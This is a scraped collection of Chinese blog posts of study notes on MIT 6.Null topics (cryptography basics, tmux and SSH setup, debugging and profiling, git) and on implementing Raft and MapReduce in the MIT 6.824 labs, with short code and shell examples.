言归正传，香农熵强度单位是 bit，可以由 log_2(# of possibilities) 计算得到，比如投一个骰子会出现 6 种点数，那它的随机性就是 2.58 bits。多少强度的密码可以被认为是安全的呢？一般来说，线上密码应该大于 40，线下则要求更高，需要 80。原因不难想到，线下能够利用硬件加速，而线上有网络等限制。 Hash 函数 CHF(Cryptographic hash function) 可以将任意长度的数据都映射成一个固定长度。 我们拿 SHA1 举例，Git 就有采用 SHA1，它能够将任意输入都转化成一个 160-bit 的输出，合 40 个 HEX 码。我们也可以在命令行中尝试使用， 123456[vagrant@localhost ~]$ printf 'hello\\n' | sha1sumf572d396fae9206628714fb2ce00f72e94f2258f -[vagrant@localhost ~]$ printf 'hello\\n' | sha1sumf572d396fae9206628714fb2ce00f72e94f2258f -[vagrant@localhost ~]$ printf 'Hello\\n' | sha1sum1d229271928d3f9e2bb0375bd6ce5db6c6d348d9 - 理想的哈希函数有以下属性： Deterministic 确定性，相同的输出总是得到相同的结果，函数本身不会变 Non-invertible 不可逆，通过结果你很难倒退出一个合理输入 Target collision resistant 目标抗碰撞，给一个输入，你很难找到一个具有相同输出的另一输入 Collision resistant 抗碰撞，你很难找到具有相同输出的两个不同的输入，和目标抗碰撞概念相仿但明显要求更加严格 虽然 SHA-1 很流行，但它已经 不再 被认为是强力 CHF，这里有一张 CHF 生命周期表， KDFs KDFs（key derivation functions 密钥推导函数）是一个和 CHF 相关的概念，常用来生成一个固定输出，并将其用作其他加密函数的密钥。KDFs 会故意放慢速度，来减缓离线暴力攻击。 具体到实际运用场景，我们用户并不希望网站明文传输或者存储我们的密码，这样安全风险太高且侵犯隐私。因此，可以将密码和 盐（随机生成）混合得到 KDF 并存储。而当需要验证时，再将用户输入和同一份盐混合，与之前存储的 KDF 对照。 对称加密 对称加密解决的是隐藏信息问题，也就是让通信双方以一种独有方式进行交流，其他人无法破解他们的交流内容。实现的原理也很简单，双方持有一份相同的密钥，可以用这个密钥加密明文，也能用这个密钥解开密文。 1234keygen() -&gt; key (this function is randomized)encrypt(plaintext: array&lt;byte&gt;, key) -&gt; array&lt;byte&gt; (the ciphertext)decrypt(ciphertext: array&lt;byte&gt;, key) -&gt; array&lt;byte&gt; (the plaintext) 密钥 key 可以由 KDF 生成，如 key = KDF(passphrase)。可以参考一些使用较为广泛的对称加密算法，比如 AES。 非对称加密 “非对称” 指的是有两个密钥，具有两个不同的角色。顾名思义，私钥是用来保密的，而公钥可以公开共享并且不会影响安全性（与对称密钥中的共享密钥相区别）。 非对称加密提供加密、解密和签名、验证功能： 1234567keygen() -&gt; (public key, private key) (this function is randomized)encrypt(plaintext: array&lt;byte&gt;, public key) -&gt; array&lt;byte&gt; (the ciphertext)decrypt(ciphertext: array&lt;byte&gt;, private key) -&gt; array&lt;byte&gt; (the plaintext)sign(message: array&lt;byte&gt;, private key) -&gt; array&lt;byte&gt; (the signature)verify(message: array&lt;byte&gt;, signature: array&lt;byte&gt;, public key) -&gt; bool (whether or not the signature is valid) 由公钥加密的信息只能由私钥解开，用函数表达就是 decrypt(encrypt(m, public key), private key) = m 实例 密码管理 常用的密码有 KeePassXC（我最喜欢的💖），pass 和 1Password（收费😅）。密码管理工具可以避免重复使用密码，随机生成的高熵密码，并且所有密码保存在一个地方，使用对称加密，密钥使用 KDF 从密码短语生成。 2FA 2FA（Two-factor authentication 双因子认证）要求使用知识因子（“你知道的东西”，其实就是密码😁）和另一个占有因子（“你拥有的东西”）。例如，网上银行应用程序要求用户输入密码和通过短信发送到手机上的验证码时，就使用了 2FA。 由于破解第二个认证因子需要付出更多，并且其他类型的因子更难以窃取或伪造，因此 2FA 可提高帐户安全性，并更好地保护组织及其用户免遭未经授权的访问。 全盘加密 全盘加密使用对称加密保护整个磁盘，是在电脑被盗时用来保护数据的。在 Linux 上使用 cryptsetup + LUKS，在 Windows 上使用自带的 BitLocker，在 macOS 上使用 FileVault。 私信 使用 Signal 或 Keybase，通过非对称加密保证端到端的安全性，但获取联系人的公钥是这里的关键步骤。 SSH 在运行 ssh-keygen 时，它会随机生成（随机性由操作系统提供信息生成）一个非对称密钥对 public_key 和 private_key。公钥按原样存储（它是公开的，所以保密并不重要），但私钥应该在磁盘上加密。 ssh-keygen 程序会提示用户输入密码，并通过 KDF 生成密钥，然后使用这个对称密钥对私钥进行加密。 在使用中，一旦服务器知道客户端的公钥（存储在 .ssh/authorized_keys 文件中），连接的客户端就可以使用非对称签名证明其身份，通过挑战应答认证机制（CRAM）来完成。在宏观层面上看，服务器选择一个随机数并将其发送给客户端，然后客户端签署此消息并将签名发送回服务器，服务器根据记录的公钥检查签名。这有效地证明客户端拥有与服务器的 .ssh/authorized_keys 文件中的公钥对应的私钥，因此服务器可以允许客户端登录。 其他 Cryptographic Right Answers","link":"/2023/05/04/mit-6-null-security/"},{"title":"MIT 6.824 Lab2 PartA","text":"我们将在 Lab2 中实现一个 Raft 系统，Raft 本身是一个分布式一致性算法。工欲善其事必先利其器，本实验难度较高，所以我先读 Raft 论文，再看助教写的 guide。为了方便理解协议的运作过程，我还去了 Raft 官网，并反复观看 Raft 可视化动画。 再次强调，本 lab 难度较大，因此我在实验中有参考不少资料，并一一列出： 【Raft 论文】⭐⭐⭐ 【助教 guide】⭐⭐⭐ 【Raft 动画】⭐⭐⭐⭐⭐ 课程建议： 如何在 Raft 使用锁 如何设计 Raft 数据结构 如何在 Raft 中 Debug 【设计实现一个科学的 Raft 日志系统】⭐⭐⭐ 【Raft 交互图】 Raft 分布式系统利用共识算法让一组机器构成一个整体，共识算法又需要复制状态机，而复制状态机实现的关键就是复制日志。复制状态机的基本原理如图所示： 在一个 Raft 集群中，每个服务器有三种角色，分别是 leader、candidate 和 follower，正常情况下是一个 leader 和多个 follower。每个 follower 都只会被动接收 RPCs，只有 leader 和 candidate 才能主动发送 RPCs。 Raft 相比于 Paxos，优势在于算法更简单易懂，而且能够将共识问题拆分成领导选举、日志复制和安全性三个部分。对于客户端而言，它只需提交指令到 leader 即可（联系 follower 的请求也会被转到 leader），当前 leader 遇到网络问题或宕机时，系统会从剩余服务器中选出一个合适的新 leader 继续为客户端提供服务。 Raft 的逻辑时间是任期 term，默认从 0 开始，且 Raft 的 Election Safety 属性规定了每个 term 最多只能有一个 leader。每个 term 由一个选举阶段和一个常规操作阶段构成，如图所示。如果 candidate 选举超时后没有当选 leader 则跳过常规操作阶段直接进入下一个 term，并再次选举。 另外，每个服务器都会维持一个 currentTerm 表示服务器当前所处的 term，并在相互通信时捎上该值，这样当服务器在通信时一旦发现自己的 term 落后，就会主动更新 term，并将角色转换成 follower，注意还需要将投票清空。相对应的，如果收到处于落后 term 的服务器发来的请求，则直接拒绝。 123456789func (rf Raft) updateTermL(newTerm int) { Debug(dTimer, &quot;S%d %s, update from T%d to T%d&quot;, rf.me, rf.state, rf.currentTerm, newTerm) rf.currentTerm = newTerm rf.state = follower rf.votedFor = -1 rf.persist()} 系统初始化 服务器初始状态都是 follower，而只要它从 leader 或 candidate 处收到有效 RPCs 就会维持在这种 follower 状态。正常情况下，leader 会定期向所有 follower 发送心跳消息（心跳检测消息本质上就是一种没有携带日志的特殊 append 消息），如果 follower 经过一段时间（该段时间称为 election timeout）仍未收到，那么它会认为当前系统无 leader，并开始选举。 项目中的 ticker 方法是一个循环自检函数，用来实现上面提到的 leader 的心跳检测和 follower 的超时检测。后缀带大写 L 的是我从代码 QA 课程中学到的，表示该方法从临界区进入，方便放心访问共享变量，过于真香我立马重构了自己之前的代码。 123456789101112131415161718func (rf Raft) ticker() { for rf.killed() == false { time.Sleep(time.Millisecond 30) rf.mu.Lock() if rf.state == leader { rf.timerRefreshL() rf.sendAppendsL(true) } else { if rf.electionTimeout.Before(time.Now()) { rf.timerRefreshL() rf.startElectionL() } } rf.mu.Unlock() }} 选举 一个 follower 开启选举的流程如下，先进入新一轮 term，转换状态为 candidate，然后投票给自己，最后并行发送 vote 请求给集群中的其他服务器。当一个 candidate 获得主体投票，即超过一半服务器的票数，则判断其赢得选举。赢得选举后，它将转换状态为 leader，并广播心跳。需要注意的一点是，这里是所有 leader 的起点。 当 candidate 在等待投票结果时，如果收到有效 append 消息，说明此时系统中已经有一个合法 leader 在运作，它则会转换成 follower。另外，如果有多个 follower 同时成了 candidate 可能会遇到投票分裂这种情况，即每个 candidate 都得不到主体投票最后没法选出 leader。而等选举超时后，所有 candidate 又同时开启新一轮选举，往复循环。为了避免这种情况，Raft 规定 election timeout 从 150-300ms 随机挑取，而不是一个固定的数字。 1234func (rf Raft) timerRefreshL() { rf.electionTimeout = time.Now().Add(150 time.Millisecond) rf.electionTimeout = rf.electionTimeout.Add(time.Duration(rand.Int63n(150)) time.Millisecond)} 投票 follower 在投票时需要遵循 FIFO 原则，另外为了维持安全性或者更确切的说是 leader Completeness 属性，还需要对哪些服务器能够被选为 leader 添加一些限制，就是 follower 只能投票给日志满足 up-to-date 的 candidate。具体来说，对比 follower 和 candidate 的日志的最后一个 entry，如果 candidate 一方的 entry 的 term 较小，则 up-to-date 为 false，反之为 true；如果 term 相等则继续比下标，如果 candidate 一方的 entry 下标较小，则 up-to-date 为 false，大于或等于都为 true。 一些细节： candidate 收到 vote 不会更新时间； 成为 leader 后要更新 nextIndex 和 matchIndex。","link":"/2022/12/03/mit-6_824-lab-2a/"},{"title":"6-824-LAB-2B","text":"TODO 客户端发送的命令会被 leader 包装成一个 entry 并添加到它的日志中，然后广播 append 消息让其他服务器复制日志。当 entry 被安全复制后，leader 上的复制状态机会应用其内部命令，并返回执行结果给客户端。另外，即使 leader 已经答复了客户端，为了满足一致性，也会对那些因为网络、奔溃或运行缓慢等而没成功复制日志的服务器重复发送 append 消息。服务器底层日志本质是一个 entry 数组，每个 entry 包含一条命令和 term（指代 entry 创建时所处的任期或者说接收到客户端命令的 leader 的任期）。 流程分析 下面讨论安全复制，当一个 entry 被复制到主体服务器后，我们称它和在其之前的全部 entry 都是可提交的。而 leader 会一直记录可提交 entry 的最高下标即 commitIndex，并在发送 append 消息以及心跳时一并传递。当一个 follower 知道一个 entry 时可提交时，它会将其应用到本地状态机上。 Raft 协议的 Log Matching 属性保证了通过下标和 term 可以唯一锁定一个 entry。当 leader 发送 append 消息时，会同时发送紧邻新 entry 的前一个 entry 的下标和 term，如果 follower 没找到这个 entry 就拒绝，找到就日志复制。这样当 leader 的 append 消息一旦返回成功，就表示该 follower 此刻日志和 leader 一致。 Raft 用 leader 的日志去覆盖 follower 的冲突日志部分来解决非一致性问题。简单来说，就是找到 leader 和 follower 日志公共部分的最后一个 entry，删除 follower 在该 entry 之后的全部日志，然后用 leader 该 entry 之后的日志替换。为了便于管理，leader 为每个 follower 准备了一个 nextIndex 去指代替换日志的第一个 entry 的下标。当 leader 当选时，会将每个 nextIndex 都指向自己日志最后一个 entry 之后的位置（last index + 1）。当日志不一致时，append 消息会返回失败给 leader，leader 会减少 nextIndex，这样反复调整直到 nextIndex 到达正确的位置。follower 结果日志复制后和 leader 保持一致，并返回成功。 对上述算法进一步改进，给 reply 添加两个参数 conflictIndex 和 ConflictTerm，当 follower 因为日志太短而找不到 prevIndex 时则让 nextIndex 指向其日志最后一个 entry 之后的位置；当 follower 发现 prevIndex 指向下标所在 entry 的 term 和自己的日志不一致时，则看 leader 有没有 entry 是那个 term 的，如果有就让 nextIndex 指向 follower 那个 term 的第一个 entry 所在下标，否则就让 nextIndex 指向 leader 那个 term 的最后一个 entry 之后一个位置（根据 leaderCompleteness 可以证明，leader 必然要短一些）。 Leader Completeness 属性保证了一个 entry 一旦被提交，就不会被更替。为了实现该属性，Raft 规定投票时需要判断是否 up-to-date；还规定规定不能通过判断是否主体复制来提交非当前任期的 entry（figure 8）。 如果 follower 和 candidate 崩溃了，那么 RPCs 返回失败，Raft 会重试 RPCs 请求。即使在完成 RPCs 任务后返回响应前失败，也做相似处理。 细节处理 来自 guide 的关于常见问题的分析和处理，这些问题通常源于我们对 Raft 论文的理解和原作者产生分歧，或者遗漏掉一些限定以及用错误的方式去处理问题导致。 Livelocks 在 Lab2 中，产生活锁的常见场景是，刚选出一个新 leader，此时一个其他节点又发起了新的选举导致新 leader 立马被抛弃。解决这个问题的关键在于重置选举计时器的时机，我们只会在如下三个场景重置：a）从当前 leader 处获得 append 消息时；b）发起新的选举时；c）向 candidate 投票时。 其中 c 情况尤为特别，当网络不稳定时，不同服务器底层日志可能有差异，这时候只会有少数几个服务器满足 up-to-date 要求。如果每当有投票请求就重置计时器而不是确定投票时重置，那么满足 up-to-date 日志的服务器可能迟迟不能开始选举。另外，一旦 candidate 超时就要立刻发起新的选举。 在处理 RPCs 时，时刻遵循 Rules for All Servers 的第二条规则： If RPC request or response contains term T > currentTerm: set currentTerm = T, convert to follower (§5.1) Incorrect RPC handlers 虽然已经有论文的 figure 2，但要想正确处理 RPCs 的细节，还需要注意： “reply false” 还暗示我们应该立刻返回，如果想要做其他的动作，需要将其放在前面，再观察逻辑是否合理； 收到 append 消息时，即使 prevLogIndex 越过本地日志最大长度，也应按 term 不匹配的情况处理而不是单独处理； 即使 append 消息未携带日志，仍然要检查： 1. Reply false if log doesn’t contain an entry at prevLogIndex whose term matches prevLogIndex (§5.3) Failure to follow The Rules 在处理 RPCs 过程中，如果 commitIndex &gt; lastApplied，则要应用日志到本地状态机上。 确保定期或者 commitIndex 更新后检查 commitIndex &gt; lastApplied 如果 leader 发出 append 消息并且被拒绝，而且不是因为日志不一致，那么 leader 应该立刻下台 leader 不能将 commitIndex 更新到上个 term 的某个位置，因此我们需要特别检查 log[N].term == currentTerm，具体参考图 8； Term confusion 正确处理 RPCs 中 term 的正确方式是，首先在 reply 中记录 term，响应后将这个 term 和 currentTerm 做对比，如果不同就不处理，当且仅当这个 term 和 currentTerm 相等时才继续处理。另外，不要用 matchIndex = nextIndex - 1 或者 matchIndex = len(log)，因为它们可能在发送 RPC 之后已经被更新过了，正确的做法是使用 matchIndex = prevLogIndex + len(entries[])。 我的补充 leader 一开始是不存在的，而 nextIndex 和 matchIndex 都和 leader 相关，因此，在 candidate 选举成功并转换成 leader 时，要让 nextIndex 赋初值，即 lastIndex+1，表示不需要替换任何 entry，这里还隐含了乐观者设定。 由于 leader 可能会对某个 follower 发送多个 append 消息，因此在处理回复时，即更新 matchIndex 和 nextIndex 时要按 args 而不是 leader 本身来判定。 每个 leader 只能 commit 当前 term 的 entry（5.4）","link":"/2022/12/08/mit-6_824-lab-2b/"},{"title":"MIT 6.824 Lab1 构建一个 MapReduce 系统","text":"遵循 lab 页 指导，并在本地部署好项目。我在观摩完 mrsequential 部分的代码后，再结合 MapReduce 论文，理清了基本思路。 准备 首先，我们会有两个角色，worker 负责处理任务，coordinator 负责管理和分配任务，一般有一个 coordinator 和多个 worker（现在先不考虑单点故障问题）。 SPOF 单点故障指系统中一点失效，就会让整个系统无法运作的部件。 单词计数任务的 map 阶段会将输入的多个文本转换成形如 “hello，1” 这样的键值数组，然后在 reduce 阶段会将这些键值数组整合并输出。另外，我们在代码设计过程中应注意：coordinator 只负责分配和管理，而 worker 负责全部的计算。 map 针对 lab1，我们的单个 map 任务会接受一个文本文件，然后将其转换成中间键值对后，由给定的 nReduce 个 reduce 任务去接收计算，lab 中已经给定为 10。也就是说，我们的一个 map 任务，假设其编号为 2，会将一个文本文件转化成 10 个中间文件，也就是 mr-2-0 到 mr-2-9。而每个 reduce 任务都会将属于自己那份文件输入，比如编号为 4 的 reduce 任务会将中间文件 mr-x-4 的全部文件输入，最终输出 mr-out-4。我们不需要做更后面的合并，测试脚本会帮我们完善这一步（可以看 test.sh 代码）。 coordinator 上面是对 lab1 的任务处理流程进行梳理，接下来我们需要针对 coordinator 按需求进行设计。为了方便管理 reduce 和 map 任务的执行进度，我们需要定义一个新的结构体 task，它包含任务类型、任务编号、是否完成，之前有将任务状态分为初始化，处理中和已完成三种状态，但后面看了助教的 QA 后，用 isDone 简单管理两种状态。之所以这样改进，是因为我们要让 coordinator 负责任务调度，如果将 inProcessing 状态传输回 worker，那么 worker 也将会参与调度工作，比如等待一段时间，这是不太完善的。 RPC 设计 另一个需要设计的是 Rpc，lab1 中我们总共涉及两种通信场景，即 worker 向 coordinator 请求任务，以及 worker 向 coordinator 通知某个任务已完成。原本我是将整个 task 作为参数在 RPC 中进行传输的，现在分析整理了一下代码需求，发现我们只需要 task 类型、task 编号、而 map 还需要 reduce 个数和 map 输入文件名、而 reduce 还需要 map 个数。而在任务完成时发送的信息，只包括 task 的类型和 task 的编号。 同步问题 最后，我们还需要处理同步问题。后面是漫长的修改，我控制并发的手段很单一，就是将 coordinator 访问共享变量的代码都用 mutex 包起来，最后用 test-mr 脚本测试的时候，总是在 map 并行测试这里失败，后面发现我的 worker 在处理 map 和 reduce 时用了 goroutine，当时为了效率加的。 再引入 cond，之前我的代码逻辑当检查完 map 任务发现有 map 任务没完成时会等待一段时间再检查，直到 map 完成后进入 reduce，同理 reduce 完成后全部结束。引入 cond 可以让 coordinator 在处理完成任务时，再激活检查一下，而不再只是呆板的定时检查，这样更符合逻辑，当然定时检查同样不能少，这样当一个任务迟迟没有完成时 coordinator 也能及时发现。","link":"/2022/12/01/mit-6_824-lab_1/"},{"title":"MIT 6.Null 命令行环境部署","text":"长期使用 Shell 的程序员应该如何通过优化工作流来节约时间呢？我想可以从以下四点出发，一是提高任务并行度，通过 Job 控制 和 TMUX 配合；二是简化或优化命令，通过 Aliase 和 Dotfiles 去配置实现；三是远程访问；四是美化 Shell 界面，良好的 ui 也能极大提高工作效率。 Job 控制 当我们需要中断 Job 时，通常是因为命令完成时间过长（比如因为网络问题导致 brew update 卡住），通常会按下 &lt;Ctrl c&gt;。这个组合键本质上是让 Shell 向当前进程传递信号 SIGINT。 Shell 使用一种称为 信号 的 unix 通信机制 向进程传递信息从而改变执行流程，因此信号是 软件中断。 杀死进程 杀死进程 有两种方式，键入 Ctrl c 从而发送 SIGINT 信号给进程，或者键入 Ctrl \\ 从而发送 SIGQUIT 信号给进程。 123456789101112#! /usr.bin/env pythonimport signal, timedef handler(signum, time): print(&quot;\\ni got a sigint, but i am not stopping&quot;)signal.signal(signal.sigint, handler)i = 0while true: time.sleep(.1) print(&quot;\\r{}&quot;.format(i), end=&quot;&quot;) i += 1 当然，一种更优雅直接的方式是向进程传递 SIGTERM 信号，利用 kill 命令向进程发送信号。 暂停或将进程放入后台 想要让运行的 Job 暂停，可以键入 Ctrl z 发送信号 SIGTSTP，这里面的 TSTP 是 Terminal Stop 的缩写。而之后则可以使用 bg 或者 fg 命令将暂停的任务继续运行。 想要查看更多信号相关信息，可以点击 here，或者直接键入 man signal 在终端查看。 终端多路复用器 一次性运行多个任务的时候，我们可以同时开多个终端窗口监视它们进度，但在命令行界面使用终端多路复用器是一种更加通用的解决方案，尤其在远程连接机器的时候。 最流行的终端多路复用器就是 TMUX，可以自己配置快捷键来快速创建和切换标签和界面。在 TMUX 中，一个 Session 就是一个独立的工作空间可以有多个窗口，而一个窗口就是一个可视标签同一个 Session 可以切割出多个窗口，一个窗口可以分为多个 Pane。 Sessions tmux 打开一个新的 session tmux new -s NAME 打开一个新的 session 并命名 tmux ls 列出当前 sessions &lt;Ctrl b&gt; d 在 session 内部键入这个命令可以退出当前 session tmux a 进入上一个 session，也可以用 - t 进入指定 session Windows &lt;Ctrl b&gt; c 创建一个新窗口 &lt;Ctrl b&gt; N 切换到第 N 个窗口 &lt;Ctrl b&gt; p 切换到上一个窗口 &lt;Ctrl b&gt; n 切换到下一个窗口 &lt;Ctrl b&gt; ，重命名当前窗口 &lt;Ctrl b&gt; w 列出所有窗口 Panes &lt;Ctrl b&gt; &quot; 水平切割窗口 &lt;Ctrl b&gt; % 竖直切割窗口 &lt;Ctrl b&gt; &lt;direction&gt; 朝特定方向移动 pane &lt;Ctrl b&gt; z 放大当前 pane 这里有关于 tmux 的快速教程。 Aliases Shell 支持 Aliasing，即用一个较短的指令作为一个长命令的别名从而减少我们的工作量，通常的用法如下： 1alias alias_name=&quot;command_to_alias arg1 arg2&quot; 比较常用过的设定有： 123456789101112131415# User specific aliases and functionsalias ll=&quot;ls -lh&quot;alias gs=&quot;git status&quot;alias gc=&quot;git commit&quot;alias v=&quot;vim&quot;alias sl=lsalias mv=&quot;mv -i&quot; # -i prompts before overwritealias mkdir=&quot;mkdir -p&quot; # -p make parent dirs as neededalias df=&quot;df -h&quot; # -h prints human readable formatalias la=&quot;ls -A&quot;alias lla=&quot;la -l&quot; 如果要将别名持久化，我们需要将其配置到 shell 启动文件中，比如 .bashrc 或者 .zshrc，这些文件又被称为 Dotfile。 Dotfiles 许多程序都会用一个以. 开头的文本文件作为配置文件，我们称这些文件为 Dotfiles，当我们输入 ls 时它们默认隐藏。Shell 在启动时会读取很多文件并加载其配置，根据 Shell 的不同，无论是登录还是交互都很复杂，这里是关于这个问题的参考。 每个人都会对自己的 Dotfiles 有特别的配置，6.null 提供了助教们的配置: Anish Jon Jose others 有一些很棒的资料可以参考。 远程访问 我们可以通过使用 Secure Shell 即 SSH 来远程连接计算机，通常输入这样的一条指令: 1ssh foo@bar.mid.edu 这里我们尝试以用户 foo 去登录服务器 bar.mid.edu，服务器既可以用 URL 表示也可以用 IP 表示。我们利用 ssh-keygen 生成密钥对，当有多套密钥对时可以用 ssh-agent 去管理。 1ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_ed25519 为了不用每次都输入密码这么麻烦，我们可以将我们的公钥复制到远程计算机，因为 ssh 会检查.ssh/authorized_keys 来决定哪些客户可以直接连接： 1234# 直接复制文件cat .ssh/id_ed25519.pub | ssh foobar@remote 'cat &gt;&gt; ~/.ssh/authorized_keys'# ssh-copy-idssh-copy-id -i .ssh/id_ed25519 foobar@remote 当我们想通过 ssh 复制文件时，可以用 scp 命令 scp path/to/local_file remote_host:path/to/remote_file Shell &amp; Frameworks TODO","link":"/2022/12/17/mit-6_null-command-line-environment/"},{"title":"MIT 6.Null 调试和性能分析","text":"“Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.” — Brian Kernighan, Unix for Beginners. 编程有一条黄金法则，“代码并不会按你所想那样运行，而只会按你所述运行”。写完代码只是编程的第一步，我们更多时间其实花在了 Debugging（调试） 和 Profiling（性能分析） 上。 Debugging 打印调试语句和日志 对于一些临时的或者 Demo 性质的程序，最简单的调试方法就是在问题代码附近不断添加打印语句，从而获得足够多信息来发现问题产生的原因。 但通常情况我们会用日志，理由如下： 我们可以将日志信息发到文件、socket 甚至远程服务器而不仅仅只是标准输出 日志支持分级，方便我们过滤输出，e.g.，INFO、DEBUG、WARN 对于新出现的问题，我们的日志中可能已经包含足够多信息去调试，而不用复现 这是一个用 Python 代码编写的日志打印程序： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import loggingimport sysclass CustomFormatter(logging.Formatter): &quot;&quot;&quot;Logging Formatter to add colors and count warning / errors&quot;&quot;&quot; grey = &quot;\\x1b[38;21m&quot; yellow = &quot;\\x1b[33;21m&quot; red = &quot;\\x1b[31;21m&quot; bold_red = &quot;\\x1b[31;1m&quot; reset = &quot;\\x1b[0m&quot; format = &quot;%(asctime)s - %(name)s - %(levelname)s - %(message)s (%(filename)s:%(lineno)d)&quot; FORMATS = { logging.DEBUG: grey + format + reset, logging.INFO: grey + format + reset, logging.WARNING: yellow + format + reset, logging.ERROR: red + format + reset, logging.CRITICAL: bold_red + format + reset } def format(self, record): log_fmt = self.FORMATS.get(record.levelno) formatter = logging.Formatter(log_fmt) return formatter.format(record)# create logger with 'spam_application'logger = logging.getLogger(&quot;Sample&quot;)# create console handler with a higher log levelch = logging.StreamHandler()ch.setLevel(logging.DEBUG)if len(sys.argv)&gt; 1: if sys.argv[1] == 'log': ch.setFormatter(logging.Formatter('%(asctime)s : %(levelname)s : %(name)s : %(message)s')) elif sys.argv[1] == 'color': ch.setFormatter(CustomFormatter())if len(sys.argv) &gt; 2: logger.setLevel(logging.__getattribute__(sys.argv[2]))else: logger.setLevel(logging.DEBUG)logger.addHandler(ch)# logger.debug(&quot;debug message&quot;)# logger.info(&quot;info message&quot;)# logger.warning(&quot;warning message&quot;)# logger.error(&quot;error message&quot;)# logger.critical(&quot;critical message&quot;)import randomimport timefor _ in range(100): i = random.randint(0, 10) if i &lt;= 4: logger.info(&quot;Value is {} - Everything is fine&quot;.format(i)) elif i &lt;= 6: logger.warning(&quot;Value is {} - System is getting hot&quot;.format(i)) elif i &lt;= 8: logger.error(&quot;Value is {} - Dangerous region&quot;.format(i)) else: logger.critical(&quot;Maximum value reached&quot;) time.sleep(0.3) 终端可以通过颜色提高可读性，像 ls 或者 grep 都使用 ANSI 转义序列 来让 shell 修改输出的颜色。e.g.，执行 echo -e &quot;\\e[38;2;255;0;0mThis is red\\e[0m&quot; 会输出一行红色的 This is red 在终端。当然，前提是这个终端支持 24-bit truecolor，像 Mac OS 的 terminal 就并不支持，需要改用只支持 16 色的 ANSI 转义序列，e.g.，执行 echo -e &quot;\\e[31;1mThis is red\\e[0m&quot;。 第三方日志 当我们在构建大型项目的时候，我们会依赖一些独立项，如 Web 服务器、数据库或者消息代理。如果程序遇到问题，我们还需要进入这些依赖项内部查看日志，因为光靠项目客户端日志提供的信息通常来说是不够的。 这些程序的日志都会把日志放到系统中，当然不同的系统存放习惯也有区别。在 UNIX 系统中，一般会放到 /var/log 目录下，比如 NGINX 将它的日志放到了 /var/log/nginx 中。 最近，很多系统开始采用 system log 来统计和整合系统上发生的所有日志消息。大多数 Linux 系统使用 systemd 来控制服务开启、关闭和运行，它的日志以一种特殊格式存放在 /var/log/journal 中，我们可以用 journalctl 命令展示内容。类似的，Mac OS 也可以用 log show 命令展示 /var/log/system.log 中的日志消息。在大部分 UNIX 系统上，你也可以用 dmsg 这个通用命令来访问日志消息。 我们可以用 logger 打印消息到系统日志中，很多编程语言都有绑定对系统日志的打印。 我们也可以用一些可视化效果更好的工具比如 lnav 来浏览日志，可以到 snapcraft 下载。 调试器 当打印调试也没用时，我们就该用调试器了。** 调试器（debugger）** 能够让我们交互式执行程序，具体来说它能做到： 到达断点时暂停 每次执行一步 当程序崩溃后能够查看变量值 有条件（自定）地暂停程序 许多编程语言本身自带调试器，比如 Java 自带 JDB，而 Python 则是 PDB。对于一些更底层的语言，我们很可能会用到 gdb、lldb 等调试器，它们俩主要面向类 C 语言的。 特殊工具 跟踪程序进行的系统调用 strace （Linux） dtruss （Mac OS） 查看网络数据包 tcpdump Wireshark 浏览器自带开发者工具，这个通常来说使用频率最高 静态分析 静态分析程序会将源代码作为输入并使用编码规则对其进行分析以推断其正确性，不同的编程语言有不同的静态分析工具，我们只需要了解这个概念即可。 如果使用 Vim 频率较高，可以考虑加入插件 ale 或者 syntastic。 Profiling 在 Debug 结束后，尽管程序能够按照预想那样跑起来了，但它有可能占用过多不必要的 CPU 和内存资源。算法只会告诉我们如何分析时间复杂度，但并不会告诉我们真正遇到程序龟速行驶时该怎么处理。Knuth 说过 “过早优化是万恶之源”，我们应该先通过 profiler 和监视器去查看到底是哪部分代码在偷偷占用大部分资源，在这之后再考虑如何优化的问题。 时钟 和 Debug 很像，一个最简单的 profiler 可以通过时钟实现，在可疑代码段前后加上时钟，我们就能得到这部分代码的运行时间。 然而这些时钟 “墙” 可能会误导你做出错误的判断，因为进程可能会在这对时钟间等待某个事件（比如打印），而且其他进程也会在这对时钟间运行。通常 time 工具会将 Real，User 和 Sys 时间作区分，“User + Sys” 才能得到进程实际消耗的 CPU 时间，StackOverflow 上有提出 相关问题。 Profilers How do Ruby &amp; Python profilers work? CPU 在绝大多数时候，我们讨论的 profiler 实际指 CPU profiler。CPU profiler 有两种实现实现方式，tracing profiler 会记录程序执行的每个函数调用，而 sampling profiler 会定期侦测程序并记录程序栈。当然，它们的最终目的都是为了帮助我们了解发现程序_究竟在哪些地方耗费了大量 CPU_。 内存 在使用类似 C 或 C++ 编程时，内存泄漏将导致内存得不到及时释放。 可视化 人类都是视觉生物，谁会喜欢盯着满屏幕字母数字去绞尽脑汁翻找自己想要的信息，这种情况在没头绪的情况下会更糟（之前有过经历，只能靠前人经验去摸索，这对于程序员来说完全没道理嘛）。 一个通用的解决方法是 Flame Graph 和 pycallgraph。 资源监控 泛用监控：最流行的当属 htop，它本身是 top 的改进版，按 h 可以查看详细使用手册。类似的，有 glances 的替品，个人觉得排版视觉更美观。 I/O 操作：iotop 磁盘使用情况：df 和 du（当然，我们一般不用 du，改用 ncdu） 内存使用情况：本身 htop 已经足够，但你也可以用 free 命令单独查看 打开文件：lsof 网络连接和配置情况：使用 ip 命令（可以看页面 examples 项），查看路由、网络设置和接口等。这里值得注意的一点是，不要再用已经被废弃的 netstat 和 ifconfig 了。 网络使用情况：iftop 参考 【 1 】Simplicity is the goal 【 2 】Premature Optimization","link":"/2023/05/02/mit-6_null-debugging-and-profiling/"},{"title":"MIT 6.NULL 版本控制 (Git)","text":"Version Control Systems (VCSs) 版本控制系统 是专门用来跟踪源码变动的工具。 VCSs 会用快照将文件夹和它里面的内容变化记录下来，每一份快照都完整包含了那一时刻文件夹及其子文件和子文件夹的状态，以及快照创建人信息和快照捎带信息。 版本控制有什么用？即使只是独立开发，通过 VCS 我们也能轻松了解某段代码的设计和修改目的，从而解放大脑，而在多人合作的场景下则需求更迫切： 谁写的这个模块？ A 文件的第 2306 行代码是谁写的？什么时候写的？为什么这么写？ 之前某个功能单元是能正常运行的，但现在无法运行了，我该去哪里找问题？ 甲部门开发 x 功能，同时让 Z 部门开发 y 功能 Git 数据模型 这个漫画讽刺了 Git 的接口设计，太过抽象容易让人困惑，以至于最后大家都像念魔咒一样用它。但如果我们自底向上，先去了解 Git 的底层设计，也就是 Git 数据模型，理解起 Git 的运作来会更加的轻松。 理解 Git 